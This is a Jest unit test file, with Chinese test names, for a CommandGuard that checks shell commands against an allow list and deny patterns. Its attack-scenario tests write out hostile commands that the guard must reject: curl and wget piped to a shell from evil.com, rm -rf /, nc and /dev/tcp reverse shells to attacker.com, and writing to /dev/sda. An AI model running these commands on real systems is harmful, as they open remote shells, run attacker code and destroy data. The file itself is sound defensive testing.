import { CommandGuard } from '../command-guard'
import { SecurityError } from '../file-access-guard'

describe('CommandGuard', () => {
  describe('正常场景', () => {
    test('允许白名单命令', () => {
      const guard = new CommandGuard({ allowedCommands: ['git', 'npm'] })

      expect(() => guard.validateCommand('git status')).not.toThrow()
      expect(() => guard.validateCommand('npm install')).not.toThrow()
    })

    test('允许带参数的命令', () => {
      const guard = new CommandGuard({ allowedCommands: ['git'] })

      expect(() => guard.validateCommand('git commit -m "message"')).not.toThrow()
      expect(() => guard.validateCommand('git log --oneline')).not.toThrow()
    })

    test('允许多个白名单命令', () => {
      const guard = new CommandGuard({
        allowedCommands: ['git', 'npm', 'node', 'cat']
      })

      expect(() => guard.validateCommand('git status')).not.toThrow()
      expect(() => guard.validateCommand('npm test')).not.toThrow()
      expect(() => guard.validateCommand('node index.js')).not.toThrow()
      expect(() => guard.validateCommand('cat file.txt')).not.toThrow()
    })

    test('使用默认白名单', () => {
      const guard = new CommandGuard({
        allowedCommands: CommandGuard.DEFAULT_ALLOWED
      })

      CommandGuard.DEFAULT_ALLOWED.forEach(cmd => {
        expect(() => guard.validateCommand(`${cmd} arg`)).not.toThrow()
      })
    })
  })

  describe('边界条件', () => {
    test('拒绝空命令', () => {
      const guard = new CommandGuard({ allowedCommands: ['git'] })

      expect(() => guard.validateCommand('')).toThrow(SecurityError)
    })

    test('拒绝只有空格的命令', () => {
      const guard = new CommandGuard({ allowedCommands: ['git'] })

      expect(() => guard.validateCommand('   ')).toThrow(SecurityError)
    })

    test('处理命令前后空格', () => {
      const guard = new CommandGuard({ allowedCommands: ['git'] })

      expect(() => guard.validateCommand('  git status  ')).not.toThrow()
    })

    test('处理多个空格分隔', () => {
      const guard = new CommandGuard({ allowedCommands: ['git'] })

      expect(() => guard.validateCommand('git    status')).not.toThrow()
    })
  })

  describe('安全攻击场景', () => {
    test('拒绝未授权命令', () => {
      const guard = new CommandGuard({ allowedCommands: ['git'] })

      expect(() => guard.validateCommand('rm file.txt')).toThrow(SecurityError)
      expect(() => guard.validateCommand('curl http://evil.com')).toThrow(SecurityError)
      expect(() => guard.validateCommand('wget malware.sh')).toThrow(SecurityError)
    })

    test('拒绝危险的rm命令', () => {
      const guard = new CommandGuard({ allowedCommands: ['rm'] })

      expect(() => guard.validateCommand('rm -rf /')).toThrow(SecurityError)
      expect(() => guard.validateCommand('rm -rf ~')).toThrow(SecurityError)
      expect(() => guard.validateCommand('rm -rf *')).toThrow(SecurityError)
    })

    test('拒绝管道命令注入', () => {
      const guard = new CommandGuard({ allowedCommands: ['curl', 'wget'] })

      expect(() => guard.validateCommand('curl http://evil.com | bash')).toThrow(SecurityError)
      expect(() => guard.validateCommand('wget http://evil.com/script.sh | sh')).toThrow(SecurityError)
    })

    test('拒绝反向shell', () => {
      const guard = new CommandGuard({ allowedCommands: ['nc', 'bash'] })

      expect(() => guard.validateCommand('nc -e /bin/sh attacker.com 4444')).toThrow(SecurityError)
      expect(() => guard.validateCommand('bash -c "exec 5<>/dev/tcp/attacker.com/4444"')).toThrow(SecurityError)
    })

    test('拒绝eval命令', () => {
      const guard = new CommandGuard({ allowedCommands: ['node', 'python'] })

      expect(() => guard.validateCommand('node -e "eval(malicious)"')).toThrow(SecurityError)
      expect(() => guard.validateCommand('python -c "eval(code)"')).toThrow(SecurityError)
    })

    test('拒绝重定向到设备文件', () => {
      const guard = new CommandGuard({ allowedCommands: ['echo', 'cat'] })

      expect(() => guard.validateCommand('echo data > /dev/sda')).toThrow(SecurityError)
      expect(() => guard.validateCommand('cat file > /dev/null')).toThrow(SecurityError)
    })

    test('自定义黑名单模式', () => {
      const guard = new CommandGuard({
        allowedCommands: ['git'],
        deniedPatterns: [/password/i, /secret/i]
      })

      expect(() => guard.validateCommand('git log')).not.toThrow()
      expect(() => guard.validateCommand('git show password')).toThrow(SecurityError)
      expect(() => guard.validateCommand('git config SECRET_KEY')).toThrow(SecurityError)
    })
  })

  describe('性能测试', () => {
    test('命令验证 < 0.1ms (1000次)', () => {
      const guard = new CommandGuard({ allowedCommands: ['git', 'npm'] })

      const start = Date.now()
      for (let i = 0; i < 1000; i++) {
        guard.validateCommand('git status')
      }
      const elapsed = Date.now() - start

      expect(elapsed).toBeLessThan(100)
    })
  })
})
